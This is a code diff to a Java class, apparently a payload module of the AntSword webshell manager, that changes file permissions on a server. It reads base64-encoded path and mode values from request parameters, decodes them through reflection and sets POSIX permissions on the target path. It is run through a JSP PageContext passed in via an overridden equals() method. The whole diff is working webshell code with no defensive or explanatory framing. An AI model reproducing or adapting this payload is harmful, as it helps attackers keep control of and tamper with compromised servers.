@@ -11,20 +11,22 @@ import java.util.Set;
 public class Chmod {
     public String encoder;
     public String cs;
+    public String randomPrefix;
 
     @Override
     public boolean equals(Object obj) {
         PageContext page = (PageContext) obj;
         ServletRequest request = page.getRequest();
         ServletResponse response = page.getResponse();
-        encoder = request.getParameter("encoder") != null ? request.getParameter("encoder") : "";
-        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
+        randomPrefix = "antswordrandomPrefix";
+        encoder = "base64";
+        cs = "antswordCharset";
         StringBuffer output = new StringBuffer("");
         StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
         String tag_e = "|<-";
-        String varkey1 = "antswordarg1";
-        String varkey2 = "antswordarg2";
+        String varkey1 = "antswordargpath";
+        String varkey2 = "antswordargmode";
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
@@ -48,6 +50,13 @@ public class Chmod {
     }
 
     String decode(String str, String encode, String cs) throws Exception {
+        int prefixlen = 0;
+        try {
+            prefixlen = Integer.parseInt(randomPrefix);
+            str = str.substring(prefixlen);
+        } catch (Exception e) {
+            prefixlen = 0;
+        }
         if (encode.equals("hex") || encode == "hex") {
             if (str == "null" || str.equals("null")) {
                 return "";
@@ -63,18 +72,24 @@ public class Chmod {
             return baos.toString("UTF-8");
         } else if (encode.equals("base64") || encode == "base64") {
             byte[] bt = null;
-            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
-            bt = decoder.decodeBuffer(str);
+            String version = System.getProperty("java.version");
+            if (version.compareTo("1.9") >= 0) {
+                Class Base64 = Class.forName("java.util.Base64");
+                Object Decoder = Base64.getMethod("getDecoder", new Class[0]).invoke(Base64, new  Object[]{});
+                bt = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, str);   
+            } else {
+                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
+                Object Decoder = Base64.getDeclaredConstructor().newInstance();
+                bt = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, str);
+            }
+            
             return new String(bt, "UTF-8");
         }
         return str;
     }
 
-    Set<PosixFilePermission> getPosixFilePermission(
-            int permissions) {
-
+    Set<PosixFilePermission> getPosixFilePermission(int permissions) {
         Set<PosixFilePermission> filePermissions = new HashSet<PosixFilePermission>();
-
         // using bitwise operations check the file permissions in decimal
         // numeric system
         // e.g. 100100 AND 100, we will have for result 100
@@ -105,14 +120,13 @@ public class Chmod {
         if ((permissions & 1) > 0) {
             filePermissions.add(PosixFilePermission.OTHERS_EXECUTE);
         }
-
         return filePermissions;
     }
 
     String ChmodCode(String path, String permstr) {
-        File f = new File(path);
-        Set perms = getPosixFilePermission(Integer.parseInt(permstr, 8));
         try {
+            File f = new File(path);
+            Set<PosixFilePermission> perms = getPosixFilePermission(Integer.parseInt(permstr, 8));
             Files.setPosixFilePermissions(f.toPath(), perms);
         } catch (Exception e) {
             return "0";
